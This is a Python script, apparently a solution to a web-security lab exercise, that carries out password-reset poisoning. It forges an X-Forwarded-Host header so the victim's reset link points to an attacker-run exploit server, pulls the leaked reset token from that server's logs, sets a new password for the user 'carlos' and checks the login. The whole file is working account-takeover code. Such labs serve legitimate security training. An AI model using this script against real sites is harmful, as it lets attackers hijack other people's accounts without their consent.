import requests
import sys
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def poison_reset(lab_url, exploit_host, username="carlos"):
    print(f"[*] Sending password request for user: {username}")
    r  = requests.Session()
    headers = {"X-Forwarded-Host": f"{exploit_host}/exploit"}
    data = {"username": username}
    resp = r.post(f"{lab_url}/forgot-password", headers=headers, data=data, verify=False)
    print(f"[+] Reset request sent (status: {resp.status_code})")

def get_token_from_log(exploit_url):    
    print("[*] Fetching token from exploit server logs")
    try:
        resp = requests.get(f"{exploit_url}/log", verify=False, timeout=10)
        match = re.search(r"temp-forgot-password-token=([a-zA-Z0-9]+)", resp.text)
        if match:
            token = match.group(1)
            print(f"[+] Token found: {token}")
            return token
    except Exception as e:
        print(f"[-] Token not found: {e}")

def reset_password(lab_url, token, username="carlos", new_password="test123"):
    print(f"[*] Resetting password for {username}")
    s = requests.Session()
    data = {"temp-forgot-password-token": token, "username": username, "new-password-1": new_password, "new-password-2": new_password}
    resp = s.post(f"{lab_url}/forgot-password", data=data, verify=False)
    print(f"[+] Reset response status: {resp.status_code}")
    return new_password

def verify_login(lab_url, password, username="carlos"):
    print(f"[*] Verifying login as {username}:{password}")
    s = requests.Session()
    data = {"username": username, "password": password}
    resp = s.post(f"{lab_url}/login", data=data, verify=False, allow_redirects=True)
    if "Log out" in resp.text:
        print(f"[+] Login successful - {username}:{password}")
        sys.exit(0)
    else:
        print("[-] Login failed")
        sys.exit(1)

def main():
    if len(sys.argv) != 3:
        print(f"[+] Usage: {sys.argv[0]} <lab_url> <exploit_server_url>")
        sys.exit(1)
    lab_url = sys.argv[1].strip().rstrip("/")
    exploit_url = sys.argv[2].strip().rstrip("/")
    exploit_host =      exploit_url.replace("https://", "").replace("http://", "")

    print(f"[+] Target lab: {lab_url}")  
    print(f"[+] Exploit server: {exploit_url}")

    poison_reset(lab_url, exploit_host)
    token = get_token_from_log(exploit_url)
    new_password = reset_password(lab_url, token)
    verify_login(lab_url, new_password)

if __name__=="__main__":
    main()   